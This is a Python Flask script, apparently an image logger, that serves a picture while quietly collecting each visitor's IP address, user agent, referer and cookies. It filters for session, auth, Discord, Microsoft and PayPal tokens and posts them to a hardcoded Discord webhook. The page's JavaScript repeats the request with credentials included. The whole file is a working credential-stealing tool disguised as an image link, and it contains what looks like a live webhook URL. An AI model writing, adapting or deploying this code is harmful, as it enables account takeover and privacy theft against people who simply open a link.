from flask import Flask, request, send_file
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important = {k: v[:300] for k, v in data.get('cookies', {}).items() if any(t in k.lower() for t in ['discord', 'token', 'auth', 'session', 'microsoft', 'paypal'])}
    
    embed = {
        "title": "📸 Image Hit",
        "color": 0x00FF00,
        "fields": [
            {"name": "IP", "value": data.get('ip'), "inline": True},
            {"name": "Time", "value": data.get('time'), "inline": True},
            {"name": "Important", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "none"},
            {"name": "All Cookies Count", "value": str(len(data.get('cookies', {})))},
            {"name": "UA", "value": data.get('ua')[:300]}
        ]
    }
    try:
        requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**Hit**"}, timeout=10)
    except:
        pass

@app.route('/image.jpg')
def logger_image():
    ip = request.remote_addr or "unknown"
    ua = request.headers.get('User-Agent', 'unknown')
    referer = request.headers.get('Referer')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'referer': referer}
    send_to_webhook(data)
    
    # Immer echtes Bild
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (1200, 800), color=(10, 10, 20))
        buf = BytesIO()
        img.save(buf, 'JPEG')
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/')
@app.route('/view')
def main_page():
    html = '''
    <!DOCTYPE html>
    <html>
    <head><style>body{margin:0;overflow:hidden;background:black}img{width:100vw;height:100vh;object-fit:contain;}</style></head>
    <body>
        <img src="/image.jpg" alt="Image">
        <script>
            // Mehrere Versuche Daten zu senden
            function sendData() {
                fetch('/image.jpg', {credentials: 'include', cache: 'no-cache'});
                setTimeout(() => window.open('/image.jpg', '_blank'), 300);
            }
            sendData();
            setTimeout(sendData, 800);
            setTimeout(sendData, 1500);
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)